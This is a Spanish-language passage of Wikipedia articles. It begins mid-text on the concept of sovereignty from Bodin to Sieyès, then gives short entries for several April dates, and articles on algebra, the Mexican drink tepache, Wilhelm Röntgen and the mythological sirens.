Cualquier orden legal, concluye sin rodeos Schmitt, se basa en una decisión soberana y no en una norma legal. Para Schmitt, ni siquiera es necesario que la ley determine quién puede tomar una decisión sobre el estado de excepción. Puede haber una autoridad soberana, en un sentido jurisprudencialmente relevante, incluso cuando dicha autoridad no está reconocida por una ley constitucional positiva. Todo lo que importa es si hay una persona o institución que posee la capacidad, de hecho, para tomar una decisión sobre la excepción. Si existe un soberano, así entendido, su autoridad para suspender la ley no necesita reconocimiento legal positivo, ya que la aplicabilidad de la ley depende de una situación de normalidad garantizada por el soberano.

Según la clásica definición de Jean Bodin, recogida en su obra de 1576 "Los seis libros de la República", soberanía es el «poder absoluto y perpetuo de una República»; y soberano es quien tiene el poder de decisión, de dar las leyes sin recibirlas de otro, es decir, aquel que no está sujeto a leyes escritas, pero sí a la ley divina o natural. Pues, según añade Bodin, «si decimos que tiene poder absoluto quien no está sujeto a las leyes, no se hallará en el mundo príncipe soberano, puesto que todos los príncipes de la tierra están sujetos a las leyes de Dios y de la naturaleza y a ciertas leyes humanas comunes a todos los pueblos».

Esta inicial definición muestra en síntesis la amplitud del concepto de soberanía, que, como tal, viene perdurando a través del tiempo, aunque no exento de variaciones a lo largo de la historia en su intento de justificar el devenir del sujeto de la soberanía (el pueblo, la Nación, el Estado).

Thomas Hobbes suprimió la dependencia de la ley natural que Jean Bodin trazaba en su definición de soberanía y constituyó al soberano en única forma de poder. De este modo, en su tratado más famoso, "Leviatán", publicado en 1651, justifica filosóficamente la existencia del autoritarismo estatal. Si bien habría que precisar que la ley natural no es ajena a las teorías de Hobbes.
En 1762, Jean-Jacques Rousseau retomó la idea de soberanía pero con un cambio sustancial. El soberano es ahora la colectividad o pueblo, y esta da origen al poder enajenando sus derechos a favor de la autoridad. Cada ciudadano es soberano y súbdito al mismo tiempo, ya que contribuye tanto a crear la autoridad y a formar parte de ella, en cuanto que mediante su propia voluntad dio origen a esta, y por otro lado es súbdito de esa misma autoridad, en cuanto que se obliga a obedecerla.

Así, según Rousseau, todos serían libres e iguales, puesto que nadie obedecería o sería mandado por un individuo, sino que la voluntad general tiene el poder soberano, es aquella que señala lo correcto y verdadero y las minorías deberían acatarlo en conformidad a lo que dice la voluntad colectiva. Esta concepción rusoniana, que en parte da origen a la revolución francesa e influye en la aparición de la democracia moderna, permitió múltiples abusos, ya que en nombre de la voluntad "general" o pueblo se asesinó y destruyó indiscriminadamente. Generó actitudes irresponsables y el atropello a los derechos de las minorías.

Frente a estas ideas, el abate Sieyès postuló que la soberanía radica en la nación y no en el pueblo, queriendo con ello expresar que la autoridad no obrara solamente tomando en cuenta el sentimiento mayoritario coyuntural de un pueblo, que podía ser objeto de influencias o pasiones desarticuladoras, sino que además tuviera en cuenta el legado histórico y cultural de esa nación y los valores y principios bajo los cuales se había fundado. Además, el concepto de nación contemplaría a todos los habitantes de un territorio, sin exclusiones ni discriminaciones. Sieyès indica que los parlamentarios son representantes y no mandatarios, ya que estos gozan de autonomía propia una vez han sido electos y ejercerán sus cargos mediando una cuota de responsabilidad y objetividad al momento de legislar; en cambio los mandatarios deben realizar lo que su mandante le indica, en este caso el pueblo.

Así, de Rousseau nace el concepto de soberanía popular, mientras que del abate Sieyès nace el de soberanía nacional. Ambos conceptos se dan indistintamente en las constituciones modernas, aunque después de la Segunda Guerra Mundial ha retomado con fuerza el concepto de soberanía popular que se mira como más cercano al pueblo, el cual se supone que actualmente tiene un grado de cultura cívica y moderación mucho más alto que en el tiempo de la toma de la Bastilla en 1789.

También la palabra soberanía se conceptualiza como el derecho de una institución política de ejercer su poder. Tradicionalmente se ha considerado que son tres los elementos de la soberanía: territorio, pueblo y poder. En el derecho internacional, la soberanía es un concepto clave, referido al derecho de un estado para ejercer sus poderes.

El concepto de soberanía no fue manejado ni por griegos ni por romanos. Dice Georg Jellinek que la idea de soberanía se forja en la Edad Media y «en lucha con estos tres poderes (la Iglesia, el Imperio romano y los grandes señores y corporaciones) ha nacido la idea de la soberanía, que es, por consiguiente, imposible de conocer sin tener igualmente conocimiento de estas luchas». Diversos autores contemplan la cuestión de la soberanía en sus obras, tal como Hermann Heller, con "La soberanía"; F. H. Hinsley, con "El concepto de soberanía"; o Harold J. Laski, con "El problema de la soberanía".

En las monarquías absolutas la soberanía corresponde al Estado, el cual a su vez queda identificado al rey («El Estado soy yo», dijo Luis XIV). De ahí que el monarca sea llamado soberano, denominación que aún perdura. El liberalismo subvirtió el concepto de soberanía y concibió dos modalidades de esta: una, revolucionaria, en la que el pueblo, considerado como un conjunto de individuos, ejerce el sufragio universal (la soberanía popular); otra, conservadora, que reside en un parlamento de voto censitario (la soberanía nacional).

El término «soberanía popular» se estableció frente a la tesis de la soberanía nacional. La Constitución francesa de 1793 fue el segundo texto legal que estableció que «la soberanía reside en el pueblo». Jean Jacques Rousseau, en "El contrato social", atribuye a cada miembro del Estado una parte igual de lo que denomina la «autoridad soberana» y propuso una tesis sobre la soberanía basada en la voluntad general. Para Jean Jacques Rousseau el soberano es el pueblo, que emerge del pacto social, y como cuerpo decreta la voluntad general manifestada en la ley.

De acuerdo con las diversas tesis mantenidas hasta la fecha, la soberanía popular implica «que la residencia legal y efectiva del poder de mando de un conjunto social se encuentra y se ejerce en y por la universalidad de los ciudadanos», y particularmente en los Estados democráticos. Así el sufragio universal se convierte en un derecho fundamental y la condición ciudadana es igual para todos con independencia de cualquier otra consideración, salvo las limitaciones de edad o juicio.

De este modo, por ejemplo, la Constitución española de 1978 reconoce que «la soberanía nacional reside en el pueblo español, del que emanan los poderes del Estado».

El vocablo «soberanía» también ha jugado un importante papel en la teoría política y en la doctrina del derecho internacional. No obstante, en ocasiones, el contenido de esta palabra ha sido oscurecido y deformado, por lo que puede entenderse de varios modos o admitir distintas interpretaciones y ser, por tanto, motivo de dudas, incertidumbre y confusión. El principal problema estriba en que, habiendo tantas definiciones del término como hay autores, no hay acuerdo sobre cuál es el objeto buscado por este concepto en el derecho internacional. Según la ya clásica definición de Jean Bodin: «Soberanía es el poder absoluto y perpetuo de una república», quien, a su vez, determina claramente cuál es el objeto de su definición. Primero establece lo que es república: «República es el recto gobierno de varias familias y de lo que les es común con poder soberano»; para seguidamente decir: «una vez establecido el fin, hay que establecer los medios para conseguirlo». Cuyo corolario sería que la soberanía es el medio para conseguir el recto gobierno, y no cualquier gobierno.

Por otro lado, Carré de Malberg, en su "Teoría general del Estado", tras analizar y descomponer el concepto de soberanía «en independencia en el exterior y superioridad en el interior del Estado», manifiesta que el concepto parece doble, pero que, en definitiva, «soberanía interna y soberanía externa no son sino los dos lados de una sola y misma soberanía».

Es posible que, pensando en esos que pretenden redefinir la soberanía, fuera lo que llevara a Georg Jellinek a decir que «la soberanía es un concepto polémico. Igualmente, quizás fuera este mismo motivo el que pudiera haber impulsado a Hermann Heller a promover la recomendación de releer la obra de Bodino (Jean Bodin), pues decía: «Me parece que muchos de los que hablan de él, en verdad no saben con certeza qué es lo que Bodino enseñó».

Carlos Augusto Rodríguez señala que una crítica científica de la soberanía debe exponer todas las definiciones de ese término y dirigir contra cada una de ellas las objeciones que procedieran. Claro está que sólo se expondrán los lineamientos generales del problema y se ofrecerán soluciones prácticas. Es preciso aclarar que no hay que confundir ni mezclar las consecuencias prácticas que resulten de esta crítica científica con lo que se concibe en la doctrina del Estado, en la del derecho constitucional o con lo que dispone realmente la Carta Magna. Estas consecuencias estrictamente servirán para alimentar la doctrina del derecho internacional, particularmente para aclarar el objeto buscado por el concepto de la soberanía dentro del mencionado derecho.



</doc>
<doc id="6301" url="https://es.wikipedia.org/wiki?curid=6301" title="13 de abril">
13 de abril

El 13 de abril es el 103.º (centésimo tercer) día del año en el calendario gregoriano y el 104.º en los años bisiestos. Quedan 262 días para finalizar el año.






</doc>
<doc id="6302" url="https://es.wikipedia.org/wiki?curid=6302" title="14 de abril">
14 de abril

El 14 de abril es el 104.º (centésimo cuarto) día del año del calendario gregoriano y el 105.º en los años bisiestos. Quedan 261 días para finalizar el año.








</doc>
<doc id="6303" url="https://es.wikipedia.org/wiki?curid=6303" title="15 de abril">
15 de abril

El 15 de abril es el 105.º (centésimo quinto) día del año en el calendario gregoriano y el 106.º en los años bisiestos. Quedan 260 días para finalizar el año.









</doc>
<doc id="6304" url="https://es.wikipedia.org/wiki?curid=6304" title="16 de abril">
16 de abril

El 16 de abril es el 106.º (centésimo sexto) día del año del calendario gregoriano y el 107.º en los años bisiestos. Quedan 259 días para finalizar el año.














</doc>
<doc id="6305" url="https://es.wikipedia.org/wiki?curid=6305" title="17 de abril">
17 de abril

El 17 de abril es el 107.º (centésimo séptimo) día del año en el calendario gregoriano y el 108.º en los años bisiestos. Quedan 258 días para finalizar el año.








.Beata María de la Encarnación, Madre.
Beata Mariana de Jesús, Virgen (1565-1624).
Santa Catalina Tekakwitha.



</doc>
<doc id="6306" url="https://es.wikipedia.org/wiki?curid=6306" title="18 de abril">
18 de abril

El 18 de abril es el 108.º (centésimo octavo) día del año en el calendario gregoriano y el 109.º en los años bisiestos. Quedan 257 días para finalizar el año.























</doc>
<doc id="6309" url="https://es.wikipedia.org/wiki?curid=6309" title="22 de abril">
22 de abril

El 22 de abril es el 112.º (centésimo duodécimo) día del año del calendario gregoriano y el 113.º en los años bisiestos. Quedan 253 días para finalizar el año.










</doc>
<doc id="6310" url="https://es.wikipedia.org/wiki?curid=6310" title="23 de abril">
23 de abril

El 23 de abril es el 113.º (centésimo decimotercer) día del año en el calendario gregoriano y el 114.º en los años bisiestos. Quedan 252 días para finalizar el año.

Promulgado como el Día Internacional del Libro por la Unesco, en conmemoración de tres grandes escritores: el entierro de Miguel de Cervantes Saavedra (según el calendario gregoriano), la muerte (y probablemente también el nacimiento) de William Shakespeare (según el calendario juliano) y la muerte de Inca Garcilaso de la Vega.









</doc>
<doc id="6316" url="https://es.wikipedia.org/wiki?curid=6316" title="Álgebra">
Álgebra

El álgebra (del árabe: الجبر "al-ŷabr" 'reintegración, recomposición') es la rama de la matemática que estudia la combinación de elementos de estructuras abstractas acorde a ciertas reglas. Originalmente esos elementos podían ser interpretados como números o cantidades, por lo que el álgebra en cierto modo originalmente fue una generalización y extensión de la aritmética. En el álgebra moderna existen áreas del álgebra que en modo alguno pueden considerarse extensiones de la aritmética (álgebra abstracta, álgebra homológica, álgebra exterior, etc.).

A diferencia de la aritmética elemental, que trata de los números y las operaciones fundamentales, en álgebra -para lograr la generalización- se introducen además símbolos (usualmente "letras") para representar parámetros (variables o coeficientes), o cantidades desconocidas (incógnitas); las expresiones así formadas son llamadas «"fórmulas algebraicas"», y expresan una regla o un principio general. El álgebra conforma una de las grandes áreas de las matemáticas, junto a la teoría de números, la geometría y el análisis.

La palabra «álgebra» proviene del vocablo árabe الجبر "al-ŷabar" (en árabe dialectal por asimilación progresiva se pronunciaba [alŷɛbɾ] de donde derivan los términos de las lenguas europeas), que se traduce como 'restauración' o 'reponimiento, reintegración'. Deriva del tratado escrito alrededor del año 820 d.C. por el matemático y astrónomo persa Muhammad ibn Musa al-Jwarizmi (conocido como Al Juarismi), titulado "Al-kitāb al-mukhtaṣar fī ḥisāb al-ŷarabi waˀl-muqābala" ("Compendio de cálculo por reintegración y comparación"), el cual proporcionaba operaciones simbólicas para la solución sistemática de ecuaciones lineales y cuadráticas. Muchos de sus métodos derivan del desarrollo de la matemática en el islam medieval, destacando la independencia del álgebra como una disciplina matemática independiente de la geometría y de la aritmética. Puede considerarse al álgebra como el arte de hacer cálculos del mismo modo que en aritmética, pero con objetos matemáticos "no-numéricos".

El adjetivo «algebraico» denota usualmente una relación con el álgebra, como por ejemplo en "estructura algebraica". Por razones históricas, también puede indicar una relación con las soluciones de ecuaciones polinomiales, números algebraicos, extensión algebraica o expresión algebraica. Conviene distinguir entre:

El álgebra usualmente se basa en estudiar las combinaciones de cadenas finitas de signos y, mientras que análisis matemático requiere estudiar límites y sucesiones de una cantidad infinita de elementos.

Las raíces del álgebra pueden rastrearse hasta la antigua matemática babilónica, que había desarrollado un avanzado sistema aritmético con el que fueron capaces de hacer cálculos en una forma algorítmica. Con el uso de este sistema lograron encontrar fórmulas y soluciones para resolver problemas que hoy en día suelen resolverse mediante ecuaciones lineales, ecuaciones de segundo grado y ecuaciones indeterminadas. En contraste, la mayoría de los egipcios de esta época, y la mayoría de los matemáticos griegos y chinos del primer milenio antes de Cristo, normalmente resolvían tales ecuaciones por métodos geométricos, tales como los descritos en el "Papiro de Rhind", "Los Elementos" de Euclides y "Los nueve capítulos sobre el arte matemático". 

Los matemáticos de la Antigua Grecia introdujeron una importante transformación al crear un álgebra de tipo geométrico, en donde los «términos» eran representados mediante los «lados de objetos geométricos», usualmente líneas a las cuales asociaban letras. Los matemáticos helénicos Herón de Alejandría y Diofanto así como también los matemáticos indios como Brahmagupta, siguieron las tradiciones de Egipto y Babilonia, si bien la "Arithmetica" de Diofanto y el "Brahmasphutasiddhanta" de Brahmagupta se hallan a un nivel de desarrollo mucho más alto. Por ejemplo, la primera solución aritmética completa (incluyendo al cero y soluciones negativas) para las ecuaciones cuadráticas fue descrita por Brahmagupta en su libro "Brahmasphutasiddhanta". Más tarde, los matemáticos árabes y musulmanes desarrollarían métodos algebraicos a un grado mucho mayor de sofisticación. 

Diofanto (siglo III d.C.), algunas veces llamado «el pádre del álgebra», fue un matemático alejandrino, autor de una serie de libros intitulados "Arithmetica". Estos textos tratan de las soluciones a las ecuaciones algebraicas.

Los babilonios y Diofanto utilizaron sobre todo métodos especiales "ad hoc" para resolver ecuaciones, la contribución de Al-Khwarizmi fue fundamental; resuelve ecuaciones lineales y cuadráticas sin el simbolismo algebraico, números negativos o el cero, por lo que debe distinguir varios tipos de >jab.

El matemático persa Omar Khayyam desarrolló la geometría algebraica y encontró la solución geométrica de la ecuación cúbica. Otro matemático persa, Sharaf Al-Din al-Tusi, encontró la solución numérica y algebraica a diversos casos de ecuaciones cúbicas; también desarrolló el concepto de función. Los matemáticos indios Mahavirá y Bhaskara II, el matemático persa Al-Karaji, y el matemático chino Zhu Shijie, resolvieron varios casos de ecuaciones de grado tres, cuatro y cinco, así como ecuaciones polinómicas de orden superior mediante métodos numéricos. 

Durante la Edad Moderna europea tienen lugar numerosas innovaciones, y se alcanzan resultados que claramente superan los resultados obtenidos por los matemáticos árabes, persas, indios o griegos. Parte de este estímulo viene del estudio de las ecuaciones polinómicas de tercer y cuarto grado. Las soluciones para ecuaciones polinómicas de segundo grado ya era conocida por los matemáticos babilónicos cuyos resultados se difundieron por todo el mundo antiguo.

El descrubrimiento del procedimiento para encontrar soluciones algebraicas de tercer y cuarto orden se dieron en la Italia del siglo XVI. También es notable que la noción de determinante fue descubierta por el matemático japonés Kowa Seki en el siglo XVII, seguido por Gottfried Leibniz diez años más tarde, con el fin de resolver sistemas de ecuaciones lineales simultáneas utilizando matrices. Entre los siglos XVI y XVII se consolidó la noción de número complejo, con lo cual la noción de álgebra empezaba a apartarse de cantidades medibles. Gabriel Cramer también hizo un trabajo sobre matrices y determinantes en el siglo XVIII. También Leonhard Euler, Joseph-Louis Lagrange, Adrien-Marie Legendre y numerosos matemáticos del siglo XVIII hicieron avances notables en álgebra.

El álgebra abstracta se desarrolló en el siglo XIX, inicialmente centrada en lo que hoy se conoce como teoría de Galois y en temas de la constructibilidad. Los trabajos de Gauss generalizaron numerosas estructuras algebraicas. La búsqueda de una fundamentación matemática rigurosa y una clasificación de los diferentes tipos de construcciones matemáticas llevó a crear áreas del álgebra abstracta durante el siglo XIX absolutamente independientes de nociones aritméticas o geométricas (algo que no había sucedido con el álgebra de los siglos anteriores).

Consiste en que los números se emplean para representar cantidades conocidas y determinadas.
Las letras se emplean para representar toda clase de cantidades, ya sean conocidas o desconocidas.
Las cantidades conocidas se expresan por las primeras letras del alfabeto: "a", "b", "c", "d", …
Las cantidades desconocidas se representan por las últimas letras del alfabeto: "u", "v", "w", "x", "y", "z".

Los signos empleados en álgebra son tres clases: Signos de operación, signos de relación y signos de agrupación.

En álgebra se verifican con las cantidades las mismas operaciones que en aritmética: suma, resta, multiplicación, elevación a potencias y extracción de raíces, que se indican con los principales signos de aritmética excepto el signo de multiplicación. En lugar del signo × suele emplearse un punto entre los factores y también se indica a la multiplicación colocando los factores entre paréntesis. Así "a"⋅"b" y ("a")("b") equivale a "a" × "b".

Se emplean estos signos para indicar la relación que existe entre dos cantidades. Los principales son:
=, que se lee igual a. Así, "a"="b" se lee “"a" igual a "b"”.
>, que se lee mayor que. Así, "x" + "y" > "m" se lee “"x" + y mayor que "m"”.
<, que se lee menor que. Así, "a" < "b" + "c" se lee “"a" menor que "b" + "c"”.

Los signos de agrupación son: el paréntesis ordinario ( ), el paréntesis angular o corchete [ ], las llaves { } y la barra o vínculo ||. Estos signos indican que la operación colocada entre ellos debe efectuarse primero. Así, ("a" + "b")"c" índica que el resultado de la suma "a" y "b" debe multiplicarse por "c"; ["a" – "b"]"m" indica que la diferencia entre "a" y "b" debe multiplicarse por "m", {"a" + "b"} ÷ {"c" – "d"} índica que la suma de "a" y "b" debe dividirse entre la diferencia de "c" y "d".
El orden de estos signos son de la siguiente forma { [ ( ) ] }, por ejemplo: { [ ("a" + "b") - "c"] ⋅ "d"} indica que al resultado de la suma de "a" + "b" debe restarse "c" y el resultado de esto multiplicarse por "d".

Los signos y símbolos son utilizados en el álgebra — y en general en teoría de conjuntos y álgebra de conjuntos — con los que se constituyen ecuaciones, matrices, series, etc. Sus letras son llamadas variables, ya que se usa esa misma letra en otros problemas y su valor va variando.

Aquí algunos ejemplos:

En matemáticas, una estructura algebraica es un conjunto de elementos con unas propiedades operacionales determinadas; es decir, lo que define a la estructura del conjunto son las operaciones que se pueden realizar con los elementos de dicho conjunto y las propiedades matemáticas que dichas operaciones poseen. Un objeto matemático constituido por un conjunto no vacío y algunas leyes de composición interna definida en él es una estructura algebraica. Las estructuras algebraicas más importantes son:





</doc>
<doc id="6318" url="https://es.wikipedia.org/wiki?curid=6318" title="Tepache">
Tepache

Es una de las bebidas fermentadas más populares de México. Normalmente tiene un muy bajo nivel alcohólico por su forma de elaboración (menos de 1% Alc. Vol.). Su gusto recuerda a la cerveza, pero dulce. La costumbre de elaborar esta bebida con maíz se continúa en varias comunidades sobre todo indígenas de México, como en los estados de Oaxaca, Querétaro, Guerrero, Puebla, Chihuahua, Sinaloa, Sonora, Veracruz, Yucatán, Campeche, Quintana Roo, Tabasco, Chiapas , Morelos, Baja California, Jalisco donde con un nivel alcohólico mayor, se empleaba para los cultos religiosos de los mayas.

El tepache en la actualidad se obtiene adicionalmente por la fermentación del jugo y la pulpa de varios tipos de frutos dulces como piña, guayaba, manzana, tuna, o naranja el cual se deja fermentar por varios días. Dependiendo de lo azucarada de la mezcla, si se deja fermentar más días, se obtienen una bebida con mayor nivel alcohólico, pero también mayor amargura y acidez en su gusto. Al cabo de semanas termina convirtiéndose en vinagre, el cual generalmente acaba con las bacterias de la fermentación.




</doc>
<doc id="6328" url="https://es.wikipedia.org/wiki?curid=6328" title="Wilhelm Röntgen">
Wilhelm Röntgen

Wilhelm Conrad Röntgen (Lennep, 27 de marzo de 1845- Múnich, 10 de febrero de 1923) fue un ingeniero mecánico y físico alemán, de la Universidad de Wurzburgo. El 8 de noviembre de 1895 produjo radiación electromagnética en las longitudes de onda correspondiente a los actualmente llamados rayos X. En los años siguientes, Röntgen publicó unos estudios «sobre un nuevo tipo de rayos», que fueron traducidos al inglés, francés, italiano y ruso.

Por su descubrimiento fue galardonado en 1901 con el primer . El premio se concedió oficialmente «en reconocimiento de los extraordinarios servicios que ha brindado con el descubrimiento de los notables rayos que llevan su nombre». Röntgen donó la recompensa monetaria a su universidad. De la misma forma que Pierre Curie haría varios años más tarde, rechazó registrar cualquier patente relacionada a su descubrimiento por razones éticas. Tampoco quiso que los rayos llevaran su nombre, aunque en alemán los rayos X se siguen conociendo como "Röntgenstrahlen" (rayos Röntgen).

La Universidad de Wurzburgo le otorgó el grado honorario de Doctor en Medicina. También en su honor recibe tal nombre la unidad de medida de la exposición a la radiación, establecida en 1928 (véase Roentgen (unidad)).

Röntgen nació en marzo de 1845 en Lennep, Alemania, hijo de un tejedor. Cuando él tenía tres años, su familia se mudó a los Países Bajos. Allí recibió su educación primaria en el Instituto de Martinnus Herman van Doorn. Luego asistió a la Escuela Técnica de Utrecht, de donde fue expulsado por realizar una caricatura de uno de sus profesores, acto que negó haber cometido.
Cuando contaba 17 años, ingresó en la Escuela Técnica de Utrecht; en 1865 inició estudios en la Escuela Politécnica de Zúrich (Suiza), y en 1868 recibió su título de ingeniero mecánico, doctorándose un año después. Trabajó como profesor de física en Estrasburgo en 1876; en la universidad alemana de Giessen, en 1879; y en el instituto de física de la Universidad Würzburg, en 1888. En 1900 le fue concedida la cátedra de física en la Universidad de Múnich; también fue nombrado director de un nuevo instituto físico creado en esa misma ciudad.

En 1874 impartió clases en la Universidad de Estrasburgo y en 1875 llegó a ser profesor de la Academia de Agricultura de Hohenheim (Wurtemberg). En 1876 retornó a Estrasburgo como profesor de Física y en 1879 llegó a ser director del departamento de física de la Universidad de Giessen. En 1888 fue nombrado físico jefe de la Universidad de Würzburg y en 1900 físico jefe de la Universidad de Múnich, por petición especial del gobierno de Baviera.

El 8 de noviembre de 1895, trabajando con un tubo de rayos catódicos, descubrió los rayos X, ganando el Premio Nobel en 1901. Los rayos X se comienzan a aplicar en todos los campos de la medicina, entre ellos el urológico. Al año del primer informe de Roentgen se habían escrito 49 libros y más de 1200 artículos en revistas científicas. Posteriormente Guyon, McIntyre y Swain utilizaron la radiología para el diagnóstico de la enfermedad litiásica. Es uno de los puntos culminantes de la medicina de finales del siglo XIX, sobre el cual se basaron numerosos diagnósticos de entidades nosológicas hasta ese momento difíciles de diagnosticar.































</doc>
<doc id="6330" url="https://es.wikipedia.org/wiki?curid=6330" title="Sirena">
Sirena

Las sirenas (en griego antiguo: Σειρήν "Seirến", ‘las que atan/encadenan’, quizá relacionado con el persa "Sir", ‘canto’, y con el sánscrito "Kimaira", ‘quimera’) son criaturas marinas mitológicas pertenecientes a las leyendas y al folclore.

Originalmente, en la Antigüedad clásica, se las representaba como seres híbridos con rostro o torso de mujer y cuerpo de ave (similares al Ba de la mitología egipcia) que habitaban en una isla rocosa; a partir de la Edad Media adquirieron apariencia pisciforme: hermosas mujeres con cola de pez en lugar de piernas que moraban en las profundidades. En ambos casos se les atribuía una irresistible voz melodiosa con la que atraían fatalmente a los marineros.
Debido a esa doble forma con que se han presentado a lo largo de la historia, muchas lenguas no latinas distinguen la sirena clásica mujer-ave (inglés "siren", alemán "Sirene") de la sirena con cola de pez (inglés , alemán ), tratándose de hecho de dos criaturas diferentes.

En el marco de la mitología clásica, las sirenas son criaturas ligeramente difusas debido al remoto trasfondo de su origen, probablemente ligado al mundo de los muertos. Se trataba de seres con cuerpo de pájaro y rostro o torso de mujer, poseedores de una voz musical prodigiosamente atractiva e hipnótica con la que embrujaban a los navegantes que pasaban junto a sus costas y los conducían a la muerte. La tradición las hacía habitar en una isla rocosa del Mediterráneo frente a Sorrento, en el litoral de la Italia meridional (en ocasiones identificada con la isla de Capri).

Distintos relatos las hacen descender de los dioses fluviales Aqueloo —una versión las hacía proceder de su sangre cuando ésta fue derramada por Heracles— o Forcis, sea sin intervención femenina o con la de las musas Estérope, Melpómene o Terpsícore, relacionadas con el canto y el baile. Su número es también impreciso, contándose entre dos y cinco. Los nombres registrados incluyen "Agláope" (la de bello rostro), "Telxiepia" (de palabras aclamantes) o "Telxínoe" (deleite del corazón), "Pisínoe" (la persuasiva), "Parténope" (aroma a doncella), "Ligeia" (empleado luego por Edgar Allan Poe para el célebre cuento homónimo sobre una mujer de mortal belleza), "Leucosia" (ser puro), "Molpe" (la musa), "Radne" (mejoramiento) y "Teles" (la perfecta). En ocasiones se les atribuye el uso de instrumentos musicales como la flauta o la lira además de la voz.

El primer testimonio escrito que se tiene de ellas es su mención en la "Odisea" de Homero, pero ya figuraban en representaciones artísticas de antigüedad mucho mayor, a menudo en monumentos y ofrendas funerarios. Se presume así su vínculo con el otro mundo, siendo muy plausible que al principio representaran iconográficmente a los espíritus de los difuntos y/o que se las considerara encargadas de transportar las almas al Hades (función que posteriormente asumiría el dios Hermes en su papel de psicopompo).

Su fama deriva principalmente del célebre episodio que protagonizan con Odiseo (Ulises) en el citado poema homérico: el héroe aqueo, durante el periplo de regreso a su patria Ítaca y prevenido por la maga Circe, pasa junto a su isla y logra salir indemne del peligro de su canto, gracias a que se hace atar al mástil de su barco mientras que el resto de la tripulación usa tapones de cera para no sucumbir al hechizo. Con todo, las sirenas también figuran en otros episodios míticos, muchas veces con reminiscencias de ese anterior papel como deidades ctónicas de la otra vida: algunas versiones narran que acompañaban a Perséfone cuando fue raptada por Hades y que su apariencia bestial fue el castigo impuesto por Deméter por no proteger a su hija del dios del inframundo; en otras, el cuerpo alado es un don de Zeus para permitirles perseguir al raptor, y aun en otras es una pena impuesta por Afrodita por resistirse a la voluptuosidad o por envidia de su gran belleza. También se cuenta que perdieron sus plumas como castigo por retar a las Musas a una competición de canto que perdieron, aunque esta anécdota supone obviar su ascendencia materna.

Desde el asentamiento mismo del mito según esta acepción, es costumbre firmemente aceptada el asumir que las sirenas embelesaban a los marineros para que se estrellaran contra los escollos cercanos y así poder devorarlos, ya que Homero describe cómo las orillas aparecen repletas de huesos humanos. No obstante, nunca se menciona expresamente que el objetivo de estas criaturas sea el asesinato y la antropofagia, y se detalla que esos huesos todavía tienen la piel adherida que "se pudre al sol". Unido a que (según el texto de la "Odisea") el contenido de la canción de las sirenas es la invitación al placer y al conocimiento, no pocos estudiosos apuntan que cabría la posibilidad de que se limitaran a atraer a los viajeros y éstos acabaran por morir de inanición en la isla, absortos en el éxtasis de esas subyugantes voces que les hacían olvidar todo lo demás. En cualquier caso, la naturaleza de las sirenas está siempre imbuída de cierta perfidia seductora.

Los antropólogos que suscriben el parentesco de las sirenas con el más allá plantean una teoría: en paralelo con arquetipos de otras culturas, quizá estos seres fueran inicialmente genios que guardaban el paso hacia las Puertas de la Muerte. Puertas que muy bien podrían estar simbólicamente emparentadas con el paso de Escila y Caribdis, al que las sirenas están próximas geográficamente según las fuentes. Eurípides, en una estrofa del coro de Helena (verso 168) las llama παρθηνικοι κοραι "parthenikoi korai", ‘jóvenes doncellas’; en este fragmento se apoyan Laurence Kahn-Lyotard y Nicole Loraux para incluirlas dentro de las figuras del Más Allá, identificándolas con las cantoras de las Islas de los Bienaventurados descritas por Platón.

En cuanto a su desaparición, la versión más extendida es que, cumpliéndose un oráculo de la diosa Gea, cuando Odiseo (u Orfeo en el caso de las "Argonáuticas") se resistió al efecto de sus voces, las sirenas cayeron al mar y se convirtieron en riscos o perecieron. En esta última variante, el cadáver de una de ellas, Parténope, fue arrastrado por las olas hasta tierra firme y en torno a su sepulcro se fundó la actual ciudad de Nápoles.

Sirenum scopuli
Según el poeta griego Hesíodo, las sirenas habitaban la isla llamada Antemoesa ("rica en flores"), donde aguardaban en solitario en un prado florido a la espera de divisar las naves para las que entonaban su canto. Según los poetas romanos Virgilio (en la epopeya Eneida) y Ovidio, vivían en los Sirenum scopuli o escollos de las sirenas, tres pequeñas islas rocosas.

La localización exacta de esta isla ha sido variada, pero siempre dentro de una misma zona. Según la "Odisea" de Homero, se encontraba entre Eea y el estrecho de Mesina (lugar de morada del monstruo Escila). A menudo se ha situado en el mar Tirreno, frente a las costas del suroeste de Italia, cerca de la ciudad de Paestum o entre Sorrento y Capri (en ocasiones identificándose con ésta, como por ejemplo hizo el ensayista y guionista inglés del siglo XVIII Joseph Addison). Otras tradiciones apuntan a las islas de Punta del Faro y/o Islas de Li Galli, cuyo nombre tradicional es Sirenuse y cuyo nombre "Los Gallos" hace referencia a la forma de pájaro de estos seres.

Todas estas ubicaciones tienen en común el ser lugares rodeados de acantilados y rocas.

En Medio Oriente: Las primeras historias conocidas sobre sirenas aparecieron en Asiria, antes del 1000 AC. El hecho de representarlas con medio cuerpo de pez se debe a la leyenda referida por Diodoro Sículo en la que Derceto ofendió a Venus y entonces la diosa le inspiró amor hacia un pastor. De este amor nació una niña, Semíramis, que llegaría a ser reina de Babilonia. Después de nacer su hija, también por obra de Venus, acabó el amor. Derceto, llena de ira, abandonó a su hija, hizo matar al hombre a quien había amado y se arrojó al agua dispuesta a suicidarse, lo que los dioses no permitieron. Así dio origen a su morfología anfibia. Esta diosa Derceto es muy similar a la figura de Atargatis la diosa siria con forma de sirena a la cual los peces le eran consagrados. La diosa fue adorada en templos en los que había grandes estanques, y, puesto que era la deidad que gobernaba los mares, sus sacerdotes solían vender licencias de pesca a los marineros.

En las Islas Británicas: Las sirenas se observaron en el folclore británico como presagios de mala suerte. Las sirenas también podrían nadar en agua dulce y llegar hasta los ríos y lagos y ahogar a sus víctimas, haciéndoles creer que eran personas que se estaban ahogando. En ocasiones, las sirenas podrían curar enfermedades. Algunas sirenas eran descritas como monstruos grandes de hasta 600 m.


En China: En algunos cuentos antiguos, las sirenas son una especie cuyas lágrimas se convierten en perlas preciosas. Las sirenas también pueden tejer un material muy valioso que no solo es ligero sino también hermoso y transparente. Debido a esto, los pescadores siempre tenían ganas de agarrarlas, pero el canto de las sirenas lo dificultaba. En otras leyendas chinas, las sirenas son unas criaturas maravillosas, hábiles y versátiles y estaba mal visto que los pescadores quisieran capturarlas.

En la Península Ibérica: Las historias de sirenas también son muy famosas en la península, hay una gran cantidad de relatos acerca de mujeres-pez que seducen a los marinos, aunque en otros, estas ninfas son totalmente benevolentes.

Sirenas en la realidad 

